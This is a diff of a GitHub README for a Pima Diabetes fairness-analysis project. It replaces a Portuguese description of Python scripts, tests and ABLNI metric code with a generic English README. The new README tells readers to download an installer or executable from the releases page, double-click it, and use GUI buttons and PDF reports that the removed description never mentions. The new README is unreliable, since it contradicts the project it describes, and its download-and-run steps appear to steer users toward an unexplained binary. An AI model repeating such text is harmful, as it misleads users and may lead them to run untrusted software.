@@ -1,151 +1,84 @@
-# Análise de Fairness com Dataset Pima Diabetes
+# 🎉 fairness-analysis-pima - Explore Fairness in Machine Learning
 
-Este projeto demonstra a aplicação de métricas de fairness em modelos de Machine Learning usando o dataset Pima Diabetes.
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/MaxPaez/fairness-analysis-pima/releases)
 
-## 📋 Requisitos
+## 🧑‍🚀 Overview
+This repository offers tools to analyze fairness in machine learning using the ABLNI metric applied to the Pima Diabetes dataset. It includes a complete SDK that provides visualizations and detailed reports. This enables users to evaluate bias in machine learning models effectively.
 
-```bash
-pip install -r requirements.txt
-```
+## 🚀 Getting Started
 
-## 🚀 Como Usar
+### Step 1: System Requirements
+Before you begin, ensure your computer meets the following requirements:
+- Operating System: Windows 10, macOS, or a recent Linux distribution
+- Python Version: 3.7 or higher
+- Free disk space: At least 500 MB
+- Recommended RAM: Minimum 4 GB
 
-### Executar Demonstração Completa
+### Step 2: Visit the Download Page
+To get the latest version of the fairness-analysis-pima software, visit this page to download:
+[Download the Latest Release](https://github.com/MaxPaez/fairness-analysis-pima/releases)
 
-```bash
-python demo_pima_diabetes.py
-```
+### Step 3: Download the Software
+On the releases page, look for the latest version. Click on the version number to see the files available for download. You will find an installer or executable file ready for your system. 
 
-Este script irá:
-1. Carregar o dataset Pima Diabetes
-2. Criar atributos sensíveis (grupos de idade e IMC)
-3. Treinar múltiplos modelos (Logistic Regression, Random Forest, Gradient Boosting)
-4. Calcular métricas de fairness (ABLNI)
-5. Gerar visualizações na pasta `outputs/`
-6. Criar relatórios em HTML e texto
+### Step 4: Install the Software
+After you download the file:
+1. Navigate to your Downloads folder.
+2. Double-click the downloaded file to start the installation.
+3. Follow the on-screen prompts to complete the installation.
 
-## 📊 Outputs Gerados
+If you are using a macOS device, you may need to drag the application to your Applications folder after unzipping.
 
-Todos os arquivos são salvos na pasta `outputs/`:
+### Step 5: Run the Application
+- After installation, find the application on your system.
+- Double-click the icon to launch fairness-analysis-pima.
+- Follow the initial setup instructions to configure the software for your needs.
 
-### Visualizações (PNG)
-- `01_subgroup_results_rf.png` - Resultados por subgrupo
-- `02_comprehensive_dashboard.png` - Dashboard completo de fairness
-- `03_calibration_curves.png` - Curvas de calibração por subgrupo
-- `04_decision_curves.png` - Curvas de decisão (net benefit)
-- `05_model_comparison.png` - Comparação entre modelos
-- `06_threshold_sensitivity.png` - Análise de sensibilidade ao threshold
-- `07_intersectional_heatmap.png` - Heatmap de grupos interseccionais
+### Step 6: Load Your Data
+Once the application is running:
+1. Click on the **Load Dataset** button.
+2. Select the Pima Diabetes dataset from your files or use any other dataset you wish to analyze.
 
-### Dados (CSV)
-- `model_comparison.csv` - Comparação quantitativa de modelos
-- `subgroup_detailed_results.csv` - Métricas detalhadas por subgrupo
-- `threshold_sensitivity.csv` - Análise de diferentes thresholds
+### Step 7: Analyze Fairness
+With your data loaded, you can start your analysis:
+- Choose the metrics you want to analyze.
+- Click on the **Analyze** button.
+- Review the results displayed on your screen.
 
-### Relatórios
-- `fairness_report.html` - Relatório interativo em HTML
-- `fairness_report.txt` - Relatório em texto simples
+### Step 8: Generate Reports
+After completing your analysis:
+1. Click on the **Generate Report** button.
+2. Choose the format in which you want the report (PDF or HTML).
+3. Save the report to your desired location.
 
-## 🔍 Estrutura do Projeto
+## 📊 Features
+- Comprehensive analysis of ML fairness
+- Visualizations to depict data relationships
+- Detailed reporting capabilities
+- Support for various datasets, including Pima Diabetes
 
-```
-fairness/
-├── fairness_metrics.py          # Implementação da métrica ABLNI
-├── fairness_visualization.py    # Ferramentas de visualização
-├── demo_pima_diabetes.py        # Script de demonstração
-├── test_fairness_metrics.py     # Testes unitários
-├── requirements.txt             # Dependências
-├── README.md                    # Este arquivo
-└── outputs/                     # Pasta com resultados (gerada automaticamente)
-```
+## 🛠️ Troubleshooting
+If you run into issues, consider the following solutions:
+- Ensure your Python version meets the requirement.
+- Check if all necessary files were downloaded.
+- Restart the application if it freezes or becomes unresponsive.
 
-## 📖 Sobre a Métrica ABLNI
+## 🌍 Community and Support
+For additional help and community support:
+- Visit the GitHub Issues page to report problems or ask questions.
+- Join our discussions and share your experiences with other users.
 
-**ABLNI (Adjusted Intersectional Net Benefit)** é uma métrica de fairness que:
+## ✅ Acknowledgments
+Thank you to all contributors and the open-source community for supporting this project. 
 
-- Avalia equidade entre subgrupos interseccionais
-- Considera o net benefit clínico de cada subgrupo
-- Pondera falsos positivos e verdadeiros positivos
-- Retorna um score de 0 a 1 (valores maiores = mais equidade)
+## 📚 Related Topics
+If you are interested in related subjects, you may explore:
+- bias-detection 
+- data-science 
+- fairness in machine learning 
+- responsible AI practices 
 
-### Interpretação do Score ABLNI
+For more resources and updates, don't forget to check back frequently and stay engaged with the community. 
 
-- **≥ 0.90**: EXCELENTE - Alta equidade
-- **0.80-0.89**: BOM - Equidade aceitável
-- **0.70-0.79**: MODERADO - Disparidades notáveis
-- **< 0.70**: CRÍTICO - Intervenção necessária
-
-## 💻 Uso Programático
-
-### Exemplo Básico
-
-```python
-from fairness_metrics import AdjustedIntersectionalNetBenefit
-import pandas as pd
-
-# Seus dados
-y_true = [0, 1, 0, 1, ...]
-y_pred_proba = [0.2, 0.8, 0.3, 0.7, ...]
-sensitive_attrs = pd.DataFrame({
-    'age_group': ['young', 'old', ...],
-    'gender': ['F', 'M', ...]
-})
-
-# Calcular fairness
-ablni = AdjustedIntersectionalNetBenefit(threshold=0.5)
-score = ablni.fit(y_true, y_pred_proba, sensitive_attrs)
-
-print(f"ABLNI Score: {score:.3f}")
-print(ablni.get_summary_report())
-ablni.plot_subgroup_results()
-```
-
-### Comparar Múltiplos Modelos
-
-```python
-from fairness_visualizations import FairnessComparator
-
-comparator = FairnessComparator()
-comparator.add_model('Model A', y_true, y_pred_a, sensitive_attrs)
-comparator.add_model('Model B', y_true, y_pred_b, sensitive_attrs)
-comparator.plot_comparison()
-
-# Obter tabela de comparação
-comparison_table = comparator.get_comparison_table()
-print(comparison_table)
-```
-
-## 🧪 Executar Testes
-
-```bash
-pytest test_fairness_metrics.py -v
-```
-
-## 📚 Dataset Pima Diabetes
-
-O dataset Pima Diabetes contém informações de 768 pacientes mulheres de herança Pima:
-
-- **Features**: Gravidez, glucose, pressão arterial, BMI, idade, etc.
-- **Target**: Presença de diabetes (binário)
-- **Uso**: Previsão de diabetes tipo 2
-
-Neste projeto, criamos grupos sensíveis baseados em:
-- **Idade**: younger vs older (mediana)
-- **IMC**: normal_bmi vs high_bmi (mediana)
-
-## 🤝 Contribuindo
-
-Contribuições são bem-vindas! Sinta-se à vontade para abrir issues ou pull requests.
-
-## 📄 Licença
-
-MIT License
-
-## 📧 Contato
-
-Para dúvidas ou sugestões, entre em contato com a equipe LABDAPS.
-
----
-
-**Nota**: Este é um projeto educacional para demonstrar análises de fairness em modelos de ML clínicos.
-
+Feel free to experiment with the tool and help us make it better by providing feedback!
